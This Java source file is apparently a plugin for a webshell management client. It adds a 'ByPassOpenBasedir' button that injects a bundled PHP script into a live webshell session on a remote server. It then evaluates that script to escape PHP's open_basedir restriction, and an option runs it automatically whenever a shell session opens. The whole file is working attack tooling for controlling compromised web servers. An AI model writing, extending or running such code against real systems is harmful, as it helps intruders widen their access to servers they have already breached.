package vip.youwe.shell.shells.plugins.php;

import vip.youwe.shell.core.Db;
import vip.youwe.shell.core.Encoding;
import vip.youwe.shell.core.annotation.PluginnAnnotation;
import vip.youwe.shell.core.imp.Payload;
import vip.youwe.shell.core.imp.Plugin;
import vip.youwe.shell.core.shell.ShellEntity;
import vip.youwe.shell.utils.Log;
import vip.youwe.shell.utils.automaticBindClick;
import vip.youwe.shell.utils.functions;
import vip.youwe.shell.utils.http.ReqParameter;

import javax.swing.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.InputStream;

@PluginnAnnotation(payloadName = "PhpDynamicPayload", Name = "ByPassOpenBasedir")
public class ByPassOpenBasedir implements Plugin {

    private static final String CLASS_NAME = "plugin.ByPassOpenBasedir";
    private static final String APP_ENV_KEY = "AutoExecByPassOpenBasedir";

    private JPanel panel = new JPanel();
    private JButton bybassButton = new JButton("ByPassOpenBasedir");
    private JCheckBox autoExec = new JCheckBox("autoExec");
    private boolean loadState;
    private ShellEntity shell;
    private Payload payload;
    private Encoding encoding;

    public ByPassOpenBasedir() {
        boolean autoExecBoolean = false;
        if ("true".equals(Db.getSetingValue(APP_ENV_KEY))) {
            autoExecBoolean = true;
        }
        this.autoExec.setSelected(autoExecBoolean);
        this.autoExec.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent paramActionEvent) {
                boolean autoExecBoolean = ByPassOpenBasedir.this.autoExec.isSelected();
                Db.updateSetingKV(APP_ENV_KEY, Boolean.toString(autoExecBoolean));
            }
        });

        this.panel.add(this.bybassButton);
        this.panel.add(this.autoExec);
        automaticBindClick.bindJButtonClick(this, this);
    }

    public JPanel getView() {
        return this.panel;
    }

    private void load() {
        if (!this.loadState) {
            try {
                InputStream inputStream = this.getClass().getResourceAsStream("assets/ByPassOpenBasedir.php");
                byte[] data = functions.readInputStream(inputStream);
                inputStream.close();
                if (this.payload.include(CLASS_NAME, data)) {
                    this.loadState = true;
                    Log.log("Load success");
                } else {
                    Log.log("Load fail");
                }
            } catch (Exception e) {
                Log.error(e);
            }
        }
    }

    private void bybassButtonClick(ActionEvent actionEvent) {
        if (!this.loadState) {
            load();
        }

        if (this.loadState) {
            byte[] result = this.payload.evalFunc(CLASS_NAME, "run", new ReqParameter());
            String resultString = this.encoding.Decoding(result);
            Log.log(resultString);
            JOptionPane.showMessageDialog(null, resultString, "提示", 1);
        } else {
            Log.error("load ByPassOpenBasedir fail!");
        }
    }

    public void init(ShellEntity arg0) {
        this.shell = arg0;
        this.payload = arg0.getPayloadModel();
        this.encoding = Encoding.getEncoding(arg0);
        if (this.autoExec.isSelected()) {
            bybassButtonClick(null);
        }
    }

}
